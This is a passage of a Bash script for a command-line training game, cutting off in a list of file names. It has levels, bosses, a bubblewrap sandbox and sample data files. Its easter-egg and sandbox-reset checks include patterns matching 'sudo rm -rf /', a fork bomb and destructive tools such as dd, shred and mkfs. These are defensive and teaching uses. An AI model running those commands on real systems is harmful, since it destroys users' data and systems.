#!/usr/bin/env bash
# cmdchamp
set -uo pipefail
[[ ${BASH_VERSINFO[0]:-0} -lt 4 || (${BASH_VERSINFO[0]} -eq 4 && ${BASH_VERSINFO[1]:-0} -lt 3) ]] && { echo "Requires bash 4.3+"; exit 1; }
_tty() { [[ -t 0 ]] || { echo "Error: requires interactive terminal" >&2; exit 1; }; }
for _dep in awk; do command -v "$_dep" &>/dev/null || { echo "Error: $_dep not found" >&2; exit 1; }; done

DATA="${XDG_DATA_HOME:-$HOME/.local/share}/cmdchamp"; mkdir -p "$DATA"; touch "$DATA/scores"

# ═══════════════════════════════════════════════════════════════════════════════
# CONSTANTS
# ═══════════════════════════════════════════════════════════════════════════════
VERSION="0.3"
SANDBOX_TIMEOUT=5      # Seconds before sandbox command times out
BOSS_THRESHOLD=4       # Correct answers needed to beat boss (out of BOSS_TOTAL)
BOSS_TOTAL=5           # Number of questions in boss round
FIRE_STREAK=5          # Streak needed for fire mode (+2 points)
REVIEW_PER_LEVEL=2     # Review questions to pick from each previous level
MAX_LEVEL=30           # Highest level number
BOSS_TIMER=15          # Seconds per boss question

# ═══════════════════════════════════════════════════════════════════════════════
# PLAYER PROFILE & BOSS SYSTEM
# ═══════════════════════════════════════════════════════════════════════════════
PLAYER_NAME="" BOSS_BEATEN=0 BEST_GAUNTLET=0 BEST_TIMED=0 EGGS_FOUND="" SC_DONE="" _PROFILE_VER=0

_load_profile() {
  _PROFILE_VER=0
  if [[ -f "$DATA/profile" ]]; then
    while IFS='=' read -r key val; do
      [[ "$key" =~ ^[A-Z_]+$ ]] || continue
      val="${val#\'}" val="${val%\'}"
      case "$key" in
        PLAYER_NAME) PLAYER_NAME="$val";;
        BOSS_BEATEN) BOSS_BEATEN="$val";;
        BEST_GAUNTLET) BEST_GAUNTLET="$val";;
        BEST_TIMED) BEST_TIMED="$val";;
        EGGS_FOUND) EGGS_FOUND="$val";;
        SC_DONE) SC_DONE="$val";;
        PROFILE_VER) _PROFILE_VER="$val";;
      esac
    done < "$DATA/profile"
    # Migrate v0 (0-indexed) → v1 (1-indexed): BOSS_BEATEN was -1/0/1/..., now 0/1/2/...
    if ((_PROFILE_VER < 1)); then
      ((BOSS_BEATEN < 0)) && BOSS_BEATEN=0 || ((++BOSS_BEATEN))
      _PROFILE_VER=1; _save_profile
    fi
    # Migrate v1 → v2: hash algorithm changed (md5→djb2), reset scores
    if ((_PROFILE_VER < 2)); then
      : > "$DATA/scores"
      _PROFILE_VER=2; _save_profile
    fi
    # Migrate v2 → v3: add easter eggs + scenario tracking
    if ((_PROFILE_VER < 3)); then
      EGGS_FOUND="" SC_DONE=""
      _PROFILE_VER=3; _save_profile
    fi
    ((BOSS_BEATEN > MAX_LEVEL)) && BOSS_BEATEN=$MAX_LEVEL
  fi
  [[ -z "$PLAYER_NAME" ]] && _first_run
}

_save_profile() {
  printf 'PLAYER_NAME=%q\nBOSS_BEATEN=%d\nBEST_GAUNTLET=%d\nBEST_TIMED=%d\nEGGS_FOUND=%q\nSC_DONE=%q\nPROFILE_VER=%d\n' \
    "$PLAYER_NAME" "$BOSS_BEATEN" "$BEST_GAUNTLET" "$BEST_TIMED" "$EGGS_FOUND" "$SC_DONE" "$_PROFILE_VER" > "$DATA/profile"
}

_first_run() {
  printf '\e[2J\e[H'
  cat <<'EOF'

    ██████╗███╗   ███╗██████╗  ██████╗██╗  ██╗ █████╗ ███╗   ███╗██████╗
   ██╔════╝████╗ ████║██╔══██╗██╔════╝██║  ██║██╔══██╗████╗ ████║██╔══██╗
   ██║     ██╔████╔██║██║  ██║██║     ███████║███████║██╔████╔██║██████╔╝
   ██║     ██║╚██╔╝██║██║  ██║██║     ██╔══██║██╔══██║██║╚██╔╝██║██╔═══╝
   ╚██████╗██║ ╚═╝ ██║██████╔╝╚██████╗██║  ██║██║  ██║██║ ╚═╝ ██║██║
    ╚═════╝╚═╝     ╚═╝╚═════╝  ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝     ╚═╝╚═╝

                      ░▒▓█ MASTER THE COMMAND LINE █▓▒░

EOF
  echo
  read -rp "    Enter your handle: " PLAYER_NAME
  PLAYER_NAME="${PLAYER_NAME//$'\e'*/}"          # strip ANSI escapes
  PLAYER_NAME="${PLAYER_NAME//$'\n'/}"            # strip newlines
  PLAYER_NAME="${PLAYER_NAME//$'\r'/}"            # strip carriage returns
  PLAYER_NAME="${PLAYER_NAME:0:20}"              # truncate to 20 chars
  [[ -z "$PLAYER_NAME" ]] && PLAYER_NAME="anon"
  BOSS_BEATEN=0; _PROFILE_VER=3
  _save_profile
  _intro
  _tutorial
}

_intro() {
  printf '\e[2J\e[H'
  # Padding: inner width 66, fixed text 41 chars ("      You are " + ". You have only your shell.")
  local pad=$((25 - ${#PLAYER_NAME})); ((pad < 0)) && pad=0
  local spaces; printf -v spaces '%*s' "$pad" ''
  cat <<EOF


    ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
    ░░                                                                  ░░
    ░░      The networks are dead. The sky is ash.                      ░░
    ░░      What remains runs on bone and silicon.                      ░░
    ░░                                                                  ░░
    ░░      You are ${W}${B}${PLAYER_NAME}${N}. You have only your shell.${spaces}░░
    ░░                                                                  ░░
    ░░      30 daemons guard the descent to ROOT.                       ░░
    ░░                                                                  ░░
    ░░      ${D}Know the words, or be forgotten.${N}                            ░░
    ░░                                                                  ░░
    ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░


EOF
  read -rsn1 -p "                            Press Enter to continue..."
  echo
}

_tutorial() {
  printf '\e[2J\e[H\n'
  cat <<EOF
    ${B}Controls${N}

    ${C}Tab${N}       Show manpage for the command
    ${C}Enter${N}     Submit answer
    ${C}Ctrl+d${N}    Quit (shows session summary)
    ${C}Up/Down${N}   Browse answer history

    ${B}Vi Mode${N} ${D}(on by default, CMD_VI=0 to disable)${N}

    ${C}Esc${N}       Normal mode
    ${C}h l${N}       Move cursor
    ${C}w b e${N}     Word navigation
    ${C}i a I A${N}   Enter insert mode
    ${C}d{motion}${N} Delete  ${C}c{motion}${N} Change
    ${C}u${N}         Undo (multi-level)
    ${C}?${N}         Full vi help (in normal mode)

EOF
  read -rsn1 -p "                            Press Enter to continue..."
  echo
}

BOSS_NAMES=("" "n00b" "CopyPasta" "CatMan" "PipeWrench" "Redirect" "Murmur" "DevNull" "AndOr" "\$VARIABLE" "\$\$"
  "BackgroundNoise" "TestCase" "SubShell" "Globber" "QuoteMaster" "ArrayLord" "TheFork" "Regex" "Cron" "Daemon"
  "RootKit" "KernelPanic" "Segfault" "ZeroDay" "TheFirewall" "Entropy" "Singularity" "Void" "Omega" "ROOT")
BOSS_FLAVOR=("" "We all die as n00bs first." "Your keystrokes echo in empty halls." "I read the bones of dead files."
  "Data flows through me like blood." "I send your output to the grave." "I feed the silence into your commands."
  "Your stderr falls into the void." "True or false. Live or die." "I hold what you've forgotten."
  "Every process has a death." "I wait in the dark between processes." "Pass my test or be terminated."
  "Trapped in shells within shells." "I match everything. I consume all." "Escape is just another cage."
  "Count from zero. End at null." "I birth processes that outlive you." "I see patterns in your ashes."
  "I wake the dead at midnight." "I run while you sleep forever." "I take what isn't given."
  "The kernel screams. No one hears." "Your memory is already corrupted." "No patch saves you from me."
  "Nothing enters. Nothing leaves." "Chaos is the only certainty." "All threads end here."
  "I am where data goes to die." "Everything ends. I am the proof." "I am ROOT. Bow or break.")
LEVEL_NAMES=("" "First Steps" "Save Your Work" "Reading Files" "Basic Pipes" "Input Redirection"
  "Here-Strings" "Error Handling" "Logic Gates" "Variables" "Special Variables" "Job Control"
  "Test Conditions" "Core File Tools" "System Admin" "Multiplexers" "Text Search"
  "File Finding" "Data Processing" "String & Arrays" "Control Flow" "Batch Ops"
  "Advanced Regex" "Git" "Network Tools" "Network Scanning" "WiFi & RF"
  "Hash Cracking" "Forensics" "Privilege Escalation" "ROOT")

SC_TOTAL=8
SC_NAMES=("" "The Broken Deploy" "Log Emergency" "Messy CSV" "Permission Lockout"
  "Find the Needle" "Archive & Extract" "The Incident" "Config Surgery")
SC_UNLOCK=("" 21 21 18 13 16 13 18 21)  # boss level needed to unlock each scenario
SC_FLAVOR=(""
  "The deploy pipeline is broken. Find the problems and fix them."
  "The logs are screaming. Triage the errors before it gets worse."
  "Someone dumped messy data. Clean it up."
  "Everything is locked down. Restore access."
  "Hidden markers are buried in the codebase. Hunt them down."
  "Package it up, ship it out, bring it back."
  "An attacker hit the server. Investigate the breach."
  "The config file is a mess. Perform surgery.")

# Victory screen - displayed after beating the final boss (ROOT)
_victory() {
  printf '\e[2J\e[H'
  local -A sc; [[ -f "$DATA/scores" ]] && while IFS='|' read -r k v; do sc[$k]=$v; done < "$DATA/scores"
  local total=0 mastered=0
  for k in "${!sc[@]}"; do
    ((++total))
    local _tier="${sc[$k]%%|*}"
    [[ "$_tier" != "0" && "$_tier" != "1" ]] && ((++mastered))
  done
  local s
  cat <<'EOF'

    ██████╗  ██████╗  ██████╗ ████████╗
    ██╔══██╗██╔═══██╗██╔═══██╗╚══██╔══╝
    ██████╔╝██║   ██║██║   ██║   ██║
    ██╔══██╗██║   ██║██║   ██║   ██║
    ██║  ██║╚██████╔╝╚██████╔╝   ██║
    ╚═╝  ╚═╝ ╚═════╝  ╚═════╝    ╚═╝

EOF
  printf -v s '%*s' $(( (70 - 20 - ${#PLAYER_NAME}) / 2 )) ''
  printf '%s%s\n\n' "$s" "${G}${B}ACCESS GRANTED: ${W}${PLAYER_NAME}${N}"
  local stat_text pad_len stat_pad
  printf -v stat_text '%s prompts seen. %s mastered.' "$total" "$mastered"
  pad_len=$((56 - ${#stat_text}))
  printf -v stat_pad '%*s' "$pad_len" ''
  local br="${D}░░${N}" edge="${D}░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░${N}"
  printf '\n'
  printf '    %s\n' "$edge"
  printf '    %s                                                              %s\n' "$br" "$br"
  printf '    %s      The daemons are silent. The descent is complete.        %s\n' "$br" "$br"
  printf '    %s      You spoke the words. They yielded.                     %s\n' "$br" "$br"
  printf '    %s                                                              %s\n' "$br" "$br"
  printf '    %s      30 bosses defeated. The shell is yours.                %s\n' "$br" "$br"
  printf '    %s      %s%s%s\n' "$br" "$stat_text" "$stat_pad" "$br"
  printf '    %s                                                              %s\n' "$br" "$br"
  printf '    %s                      %sYou are ROOT.%s                          %s\n' "$br" "${B}" "${N}" "$br"
  printf '    %s                                                              %s\n' "$br" "$br"
  printf '    %s\n' "$edge"
  echo
  read -rsn1 -p "                          Press any key to exit..."
  echo
}

# Boss splash screen
_boss_splash() {
  local lv=$1
  local boss="${BOSS_NAMES[$lv]}"
  local flavor="${BOSS_FLAVOR[$lv]}"
  printf '\e[2J\e[H\n\n'
  local s info
  printf -v s '%*s' $(( (80 - 12) / 2 )) ''
  printf '%s%s\n\n' "$s" "${W}${B}═══ BOSS ═══${N}"
  printf -v s '%*s' $(( (80 - ${#boss}) / 2 )) ''
  printf '%s%s\n\n' "$s" "${W}${B}${boss}${N}"
  printf -v s '%*s' $(( (80 - ${#flavor} - 2) / 2 )) ''
  printf '%s%s\n\n' "$s" "${D}\"${flavor}\"${N}"
  printf -v info 'No manpages. %d/%d to pass.' "$BOSS_THRESHOLD" "$BOSS_TOTAL"
  printf -v s '%*s' $(( (80 - ${#info}) / 2 )) ''
  printf '%s%s\n' "$s" "${D}${info}${N}"
  echo
  printf -v s '%*s' $(( (80 - 26) / 2 )) ''
  read -rsn1 -p "${s}Press Enter to continue..."
  echo
}

# ═══════════════════════════════════════════════════════════════════════════════
# SANDBOX SYSTEM - Real command execution in isolated environment
# ═══════════════════════════════════════════════════════════════════════════════
SANDBOX_MODE=1  # ON by default
SANDBOX_PRISTINE="$DATA/sandbox.pristine"
SANDBOX_DIR="$DATA/sandbox"

# Check bwrap dependency
_check_bwrap() {
  command -v bwrap &>/dev/null || {
    printf '%s\n' "${R}Error: bubblewrap (bwrap) not installed${N}" >&2
    echo "Install: paru -S bubblewrap" >&2
    SANDBOX_MODE=0
    return 1
  }
}

# Generate log file with realistic nginx-style entries
_gen_log() {
  local f="$1" lines="${2:-50}"
  local ips=("192.168.1.100" "10.0.0.5" "172.16.0.50" "192.168.8.1" "10.10.10.10")
  local codes=("200" "200" "200" "200" "301" "304" "400" "403" "404" "500")
  local methods=("GET" "GET" "GET" "POST" "PUT" "DELETE")
  local paths=("/" "/index.html" "/api/users" "/api/data" "/login" "/static/style.css" "/favicon.ico" "/admin" "/search" "/api/v1/status")
  local agents=("Mozilla/5.0" "curl/7.68" "wget" "Python-requests" "Go-http-client")
  local now; printf -v now '%(%s)T' -1
  > "$f"
  for ((i=0; i<lines; i++)); do
    _fpick ips; local ip=$REPLY; _fpick codes; local code=$REPLY
    _fpick methods; local method=$REPLY; _fpick paths; local path=$REPLY
    _fpick agents; local agent=$REPLY; local size=$((RANDOM % 50000 + 100))
    local ts; printf -v ts '%(%d/%b/%Y:%H:%M:%S +0000)T' "$((now - RANDOM % 86400))"
    printf '%s - - [%s] "%s %s HTTP/1.1" %s %d "%s"\n' "$ip" "$ts" "$method" "$path" "$code" "$size" "$agent"
  done >> "$f"
}

# Generate app log with ERROR/WARN/INFO levels
_gen_app_log() {
  local f="$1" lines="${2:-40}"
  local levels=("INFO" "INFO" "INFO" "INFO" "WARN" "WARN" "ERROR" "DEBUG")
  local msgs_info=("Request processed" "User logged in" "Cache hit" "Connection established" "Task completed" "Session started")
  local msgs_warn=("Slow query detected" "Memory usage high" "Rate limit approaching" "Deprecated API used" "Retry attempt")
  local msgs_error=("Connection refused" "Timeout exceeded" "Invalid request" "Permission denied" "Database error" "Null pointer")
  local now; printf -v now '%(%s)T' -1
  > "$f"
  for ((i=0; i<lines; i++)); do
    _fpick levels; local level=$REPLY
    local ts; printf -v ts '%(%Y-%m-%d %H:%M:%S)T' "$((now - RANDOM % 86400))"
    local msg
    case "$level" in
      INFO|DEBUG) _fpick msgs_info; msg=$REPLY;;
      WARN) _fpick msgs_warn; msg=$REPLY;;
      ERROR) _fpick msgs_error; msg=$REPLY;;
    esac
    printf '[%s] %s: %s\n' "$ts" "$level" "$msg"
  done >> "$f"
}

# Generate CSV with headers and typed data
_gen_csv() {
  local f="$1" rows="${2:-30}"
  local names=("Alice" "Bob" "Charlie" "Diana" "Eve" "Frank" "Grace" "Henry" "Ivy" "Jack")
  local domains=("example.com" "test.org" "demo.net" "sample.io")
  local statuses=("active" "active" "active" "inactive" "pending")
  local now; printf -v now '%(%s)T' -1
  echo "id,name,email,status,timestamp" > "$f"
  for ((i=1; i<=rows; i++)); do
    _fpick names; local name=$REPLY; _fpick domains; local domain=$REPLY
    _fpick statuses; local status=$REPLY
    local ts; printf -v ts '%(%Y-%m-%d)T' "$((now - RANDOM % 2592000))"
    printf '%d,%s,%s@%s,%s,%s\n' "$i" "$name" "${name,,}" "$domain" "$status" "$ts"
  done >> "$f"
}

# Generate INI config
_gen_ini() {
  local f="$1"
  cat > "$f" <<'EOF'
[server]
host = 0.0.0.0
port = 8080
workers = 4
timeout = 30

[database]
type = postgresql
host = localhost
port = 5432
name = appdb
user = admin

[logging]
level = info
file = /var/log/app.log
rotate = daily

[cache]
enabled = true
ttl = 3600
backend = redis
EOF
}

# Generate YAML config
_gen_yaml() {
  local f="$1"
  cat > "$f" <<'EOF'
server:
  host: 0.0.0.0
  port: 8080
  workers: 4
  ssl:
    enabled: false
    cert: /etc/ssl/cert.pem

database:
  primary:
    host: localhost
    port: 5432
    name: appdb
  replica:
    host: replica.local
    port: 5432

logging:
  level: info
  outputs:
    - stdout
    - file:/var/log/app.log

features:
  cache: true
  metrics: true
  debug: false
EOF
}

# Generate plain text notes
_gen_txt() {
  local f="$1"
  cat > "$f" <<'EOF'
Meeting Notes - Project Review
==============================

Attendees: Alice, Bob, Charlie

Action Items:
1. Update documentation
2. Fix authentication bug
3. Deploy to staging
4. Review security patches

Discussion Points:
- Performance improvements needed
- New feature requests from users
- Timeline for next release

TODO: Schedule follow-up meeting
TODO: Review pull requests
TODO: Update dependencies

Notes:
The deployment went smoothly.
Minor issues with caching fixed.
Need to monitor error rates.

Completed tasks:
- Database migration
- API versioning
- Load testing
EOF
}

# Generate user data CSV
_gen_users_csv() {
  local f="$1" rows="${2:-20}"
  local fnames=("john" "jane" "mike" "sarah" "tom" "lisa" "david" "emma" "alex" "olivia")
  local lnames=("smith" "jones" "wilson" "brown" "taylor" "davis" "miller" "garcia" "martinez" "lee")
  local roles=("admin" "user" "user" "user" "moderator" "guest")
  local now; printf -v now '%(%s)T' -1
  echo "username,fullname,role,created,logins" > "$f"
  for ((i=1; i<=rows; i++)); do
    _fpick fnames; local fn=$REPLY; _fpick lnames; local ln=$REPLY
    _fpick roles; local role=$REPLY; local logins=$((RANDOM % 500))
    local ts; printf -v ts '%(%Y-%m-%d)T' "$((now - RANDOM % 31536000))"
    printf '%s_%s,%s %s,%s,%s,%d\n' "$fn" "$ln" "${fn^}" "${ln^}" "$role" "$ts" "$logins"
  done >> "$f"
}

# Generate JSON data
_gen_json() {
  local f="$1"
  cat > "$f" <<'EOF'
{
  "version": "1.0.0",
  "data": [
    {"id": 1, "name": "Item One", "status": "active", "count": 42},
    {"id": 2, "name": "Item Two", "status": "pending", "count": 17},
    {"id": 3, "name": "Item Three", "status": "active", "count": 89},
    {"id": 4, "name": "Item Four", "status": "inactive", "count": 5}
  ],
  "metadata": {
    "total": 4,
    "generated": "2024-01-15"
  }
}
EOF
}

# Generate all sandbox files
_gen_sandbox_files() {
  local dir="$1"
  mkdir -p "$dir"/{src/test,logs,data,backup,temp,config,test}

  _gen_log "$dir/server.log" 50
  _gen_app_log "$dir/app.log" 40
  _gen_csv "$dir/data.csv" 30
  _gen_users_csv "$dir/users.csv" 20
  _gen_ini "$dir/config.ini"
  _gen_yaml "$dir/settings.yaml"
  _gen_txt "$dir/notes.txt"
  # Second text file - todo list
  cat > "$dir/todo.txt" <<'EOF'
Task List
=========

[ ] Review PR #123
[ ] Update API docs
[ ] Fix login timeout
[x] Deploy v2.1.0
[x] Merge feature branch
[ ] Refactor user service
[ ] Add unit tests
[ ] Setup CI pipeline
EOF
  _gen_json "$dir/data/export.json"

  # Access/error logs
  _gen_log "$dir/logs/access.log" 30
  _gen_app_log "$dir/logs/error.log" 20

  # Safe script (echo only)
  cat > "$dir/backup.sh" <<'EOF'
#!/bin/bash
echo "Backup started at $(date)"
echo "Backing up files..."
echo "Backup complete!"
EOF
  chmod +x "$dir/backup.sh"

  # Second script - deploy
  cat > "$dir/deploy.sh" <<'EOF'
#!/bin/bash
echo "Deploying application..."
echo "Version: $(cat VERSION 2>/dev/null || echo 'unknown')"
echo "Deploy complete!"
EOF
  chmod +x "$dir/deploy.sh"

  # Python source files
  cat > "$dir/main.py" <<'EOF'
#!/usr/bin/env python3
"""Main application module."""

def main():
    print("Hello, World!")
    return 0

if __name__ == "__main__":
    main()
EOF

  cat > "$dir/src/utils.py" <<'EOF'
"""Utility functions."""

def helper(x):
    return x * 2

def process(data):
    return [helper(item) for item in data]
EOF

  cat > "$dir/src/test/test_utils.py" <<'EOF'
"""Tests for utils module."""
import unittest

class TestUtils(unittest.TestCase):
    def test_helper(self):
        self.assertEqual(helper(2), 4)

if __name__ == "__main__":
    unittest.main()
EOF
}

# Initialize sandbox (create pristine copy if needed)
_sandbox_init() {
  ((SANDBOX_MODE)) || return 0
  _check_bwrap || return 1
  # Check available disk space (need at least 10MB)
  local _avail; _avail=$(df -k "${DATA%/*}" 2>/dev/null | awk 'NR==2{print $4}')
  if [[ -n "$_avail" ]] && ((_avail < 10240)); then
    printf '%s\n' "${Y}Warning: low disk space, sandbox disabled${N}" >&2
    SANDBOX_MODE=0; return 1
  fi
  if [[ ! -d "$SANDBOX_PRISTINE" ]]; then
    _gen_sandbox_files "$SANDBOX_PRISTINE"
  fi
  _sandbox_reset
}

# Reset sandbox to pristine state
_sandbox_reset() {
  ((SANDBOX_MODE)) || return 0
  [[ -d "$SANDBOX_PRISTINE" ]] || return 1
  chmod -R u+rwX "$SANDBOX_DIR" 2>/dev/null  # unlock any restricted dirs (e.g. scenario 4)
  rm -rf "$SANDBOX_DIR"
  if ! cp -a "$SANDBOX_PRISTINE" "$SANDBOX_DIR"; then
    printf '%s\n' "${Y}Warning: sandbox reset failed, disabling${N}" >&2
    SANDBOX_MODE=0; return 1
  fi
}

# Execute command in sandbox with bwrap isolation
_sandbox_exec() {
  local cmd="$1" timeout_sec="${2:-$SANDBOX_TIMEOUT}"
  ((SANDBOX_MODE)) || return 1

  # Build bwrap args - bind /lib* only if they exist
  local -a bwrap_args=(
    --ro-bind /usr /usr
    --ro-bind /bin /bin
    --ro-bind /etc/passwd /etc/passwd
    --ro-bind /etc/group /etc/group
    --bind "$SANDBOX_DIR" /sandbox
    --chdir /sandbox
    --setenv HOME /sandbox
    --setenv USER sandbox
    --unshare-all
    --die-with-parent
    --new-session
  )
  [[ -e /lib ]] && bwrap_args+=(--ro-bind /lib /lib)
  [[ -e /lib64 ]] && bwrap_args+=(--ro-bind /lib64 /lib64)

  local _rc
  timeout "$timeout_sec" bwrap "${bwrap_args[@]}" /bin/bash -c "$cmd"; _rc=$?
  ((_rc >= 125)) && printf "${R}sandbox error (exit %d)${N}\n" "$_rc" >&2
  return "$_rc"
}

# Track if command was destructive (for per-question reset)
_SANDBOX_DESTRUCTIVE=0
_is_destructive() {
  local cmd="$1"
  # File-modifying commands
  [[ "$cmd" =~ (^|[[:space:]])(rm|mv|cp|dd|truncate|shred|unlink|tee|chmod|chown|mkfs|fdisk|parted|install|split|patch|ln)[[:space:]] ]] && return 0
  # Output redirection
  [[ "$cmd" =~ ([[:space:]]|[0-9&])(\>\>|\>) ]] && return 0
  # In-place sed
  [[ "$cmd" =~ sed[[:space:]]+-i ]] && return 0
  # Truncation via :>
  [[ "$cmd" =~ :[[:space:]]*\> ]] && return 0
  # find -delete
  [[ "$cmd" =~ -delete[[:space:]]*$ ]] && return 0
  # Recursive delete patterns
  [[ "$cmd" =~ rsync[[:space:]].*--delete|xargs[[:space:]].*(rm|mv)|find[[:space:]].*-exec[[:space:]].*(rm|mv) ]] && return 0
  return 1
}

# Validate command output
# Returns 0 if output matches expected
# Expected formats:
#   exact text - exact match
#   ~regex     - regex match
#   @N         - line count match
#   *          - any output (just check command ran)
_sandbox_check_output() {
  local actual="$1" expected="$2"
  [[ -z "$expected" ]] && return 1

  case "$expected" in
    \~*)  # Regex match
      local pattern="${expected:1}"
      [[ "$actual" =~ $pattern ]] && return 0
      ;;
    @*)   # Line count match
      local count="${expected:1}"
      local lines=0; [[ -n "$actual" ]] && lines=$(printf '%s\n' "$actual" | wc -l)
      ((lines == count)) && return 0
      ;;
    \*)   # Any output
      [[ -n "$actual" ]] && return 0
      ;;
    *)    # Exact match (trimmed)
      actual="${actual#"${actual%%[![:space:]]*}"}"
      actual="${actual%"${actual##*[![:space:]]}"}"
      expected="${expected#"${expected%%[![:space:]]*}"}"
      expected="${expected%"${expected##*[![:space:]]}"}"
      [[ "$actual" == "$expected" ]] && return 0
      ;;
  esac
  return 1
}

# Validate file state after command
# Formats: exists:file, !exists:file, contains:file:pattern, !contains:file:pattern, lines:file:N, perm:file:rwx
_sandbox_check_state() {
  local checks="$1"
  IFS=',' read -ra checks_arr <<< "$checks"
  for check in "${checks_arr[@]}"; do
    case "$check" in
      exists:*|!exists:*)
        local _neg=0; [[ "$check" == !* ]] && { _neg=1; check="${check:1}"; }
        local file="${check#exists:}"
        ((_neg)) && { [[ ! -e "$SANDBOX_DIR/$file" ]] || return 1; } || { [[ -e "$SANDBOX_DIR/$file" ]] || return 1; }
        ;;
      contains:*:*|!contains:*:*)
        local _neg=0; [[ "$check" == !* ]] && { _neg=1; check="${check:1}"; }
        local rest="${check#contains:}"; local file="${rest%%:*}" pattern="${rest#*:}"
        ((_neg)) && { grep -qF "$pattern" -- "$SANDBOX_DIR/$file" 2>/dev/null && return 1; } || { grep -qF "$pattern" -- "$SANDBOX_DIR/$file" 2>/dev/null || return 1; }
        ;;
      lines:*:*)
        local rest="${check#lines:}"; local file="${rest%%:*}" count="${rest#*:}"
        local actual=$(wc -l < "$SANDBOX_DIR/$file" 2>/dev/null)
        ((actual == count)) || return 1
        ;;
      perm:*:*|!perm:*:*)
        local _neg=0; [[ "$check" == !* ]] && { _neg=1; check="${check:1}"; }
        local rest="${check#perm:}"; local file="${rest%%:*}" perms="${rest#*:}"
        local path="$SANDBOX_DIR/$file"
        [[ ! -e "$path" ]] && return 1
        local _p
        for ((_p=0; _p<${#perms}; _p++)); do
          case "${perms:$_p:1}" in
            r) ((_neg)) && { [[ ! -r "$path" ]] || return 1; } || { [[ -r "$path" ]] || return 1; };;
            w) ((_neg)) && { [[ ! -w "$path" ]] || return 1; } || { [[ -w "$path" ]] || return 1; };;
            x) ((_neg)) && { [[ ! -x "$path" ]] || return 1; } || { [[ -x "$path" ]] || return 1; };;
          esac
        done
        ;;
    esac
  done
  return 0
}
# Terminal state management
_stty_saved="" _interactive=0
_cleanup() { ((_interactive)) && { printf '\e[?25h'; [[ -n "$_stty_saved" ]] && stty "$_stty_saved" 2>/dev/null; echo; }; }
trap '_cleanup; exit 0' INT TERM HUP EXIT
R=$'\e[31m' G=$'\e[32m' Y=$'\e[33m' C=$'\e[36m' W=$'\e[97m' D=$'\e[2m' B=$'\e[1m' N=$'\e[0m'
PROMPT_CHAR="${CMD_PROMPT:-$([[ $EUID -eq 0 ]] && echo '# ' || echo '$ ')}"

# ═══════════════════════════════════════════════════════════════════════════════
# EASTER EGGS
# ═══════════════════════════════════════════════════════════════════════════════
_EGG_TOTAL=8
declare -A _EGG_DESC=(
  [sudorm]="Answer sudo rm -rf /"
  [forkbomb]="Answer a fork bomb"
  [rtfm]="Answer just 'man' with no arguments"
  [streak10]="Get a 10+ answer streak"
  [nightowl]="Play between midnight and 4am"
  [flawless]="Beat a boss without a single mistake"
  [vimquit]="Try to :q! or :wq out of the game"
  [completionist]="Complete all scenarios"
)
_egg_found() {
  local name=$1
  [[ ",$EGGS_FOUND," == *",$name,"* ]] && return
  [[ -n "$EGGS_FOUND" ]] && EGGS_FOUND="$EGGS_FOUND,$name" || EGGS_FOUND="$name"
  _save_profile
  printf '\n%s\n' "${Y}${B}★ EASTER EGG: ${name} ★${N}"
  printf '%s\n' "${_EGG_DESC[$name]:-}"
  local egg_count=0
  IFS=',' read -ra _ea <<< "$EGGS_FOUND"; egg_count=${#_ea[@]}
  printf '%s\n\n' "${D}${egg_count}/${_EGG_TOTAL} discovered${N}"
  sleep 3
}
_egg_check() {
  local trigger=$1 ctx=${2:-}
  case "$trigger" in
    wrong)
      [[ "$ctx" == "sudo rm -rf /"* ]] && _egg_found sudorm
      [[ "$ctx" == *":()"*":|:"* ]] && _egg_found forkbomb
      [[ "$ctx" == "man" ]] && _egg_found rtfm
      ;;
    streak) ((_S_STREAK >= 10)) && _egg_found streak10;;
    nightowl) local h; printf -v h '%(%H)T' -1; ((h < 4)) && _egg_found nightowl;;
    flawless) _egg_found flawless;;
    completionist)
      local i done=1
      for ((i=1; i<=SC_TOTAL; i++)); do
        [[ ",$SC_DONE," == *",$i,"* ]] || { done=0; break; }
      done
      ((done)) && _egg_found completionist
      ;;
  esac
}

# ═══════════════════════════════════════════════════════════════════════════════
# VARIABLE POOLS
# ═══════════════════════════════════════════════════════════════════════════════

SANDBOX_LOGS=(server.log app.log logs/access.log logs/error.log)
SANDBOX_TXTS=(notes.txt todo.txt)
SANDBOX_CSVS=(data.csv users.csv)
SANDBOX_CFGS=(config.ini settings.yaml)
SANDBOX_SCRIPTS=(backup.sh deploy.sh)
SANDBOX_PY=(main.py src/utils.py src/test/test_utils.py)
LOGS=(server.log app.log system.log auth.log access.log error.log debug.log nginx.log apache.log syslog
  messages kern.log daemon.log mail.log secure dpkg.log pacman.log audit.log boot.log faillog lastlog
  wtmp btmp cron.log yum.log dmesg)
CONFIGS=(config.ini settings.conf app.yaml server.conf nginx.conf httpd.conf my.cnf pg.conf
  redis.conf sshd_config sudoers fstab hosts resolv.conf profile bashrc vimrc tmux.conf gitconfig
  docker-compose.yml)
SCRIPTS=(backup.sh deploy.sh build.sh test.sh cleanup.sh migrate.sh sync.sh init.sh
  setup.sh install.sh update.sh monitor.sh healthcheck.sh rotate.sh fetch.sh push.sh start.sh stop.sh
  restart.sh validate.sh)
TXTS=(data.txt notes.txt output.txt report.txt dump.txt results.txt temp.txt
  readme.txt todo.txt changelog.txt manifest.txt inventory.txt urls.txt hosts.txt targets.txt)
CSVS=(data.csv users.csv logs.csv export.csv report.csv stats.csv
  metrics.csv transactions.csv inventory.csv orders.csv customers.csv events.csv)
BINS=(binary.exe program.elf app.bin firmware.bin malware.exe sample.bin
  payload.dll trojan.exe rootkit.so agent.bin dropper.exe beacon.bin)
IMGS=(disk.img backup.img system.img evidence.img
  memory.dmp vmcore.dmp hiberfil.sys pagefile.sys snapshot.raw forensic.dd)
PCAPS=(capture.pcap traffic.pcap network.pcap dump.pcap
  scan.pcap attack.pcap session.pcap handshake.pcap dns.pcap http.pcap)
HASHES=(hash.txt hashes.txt md5.txt sha256.txt passwd.txt shadow.txt
  ntlm.txt cracked.txt potfile.txt wordlist.hash lm.txt bcrypt.txt)
WORDLISTS=(wordlist.txt rockyou.txt passwords.txt dict.txt
  common.txt custom.txt leaked.txt company.txt names.txt cities.txt hybrid.txt rules.txt)
ARCHIVES=(backup.tar.gz archive.tar.gz files.tgz data.tar.bz2 export.zip
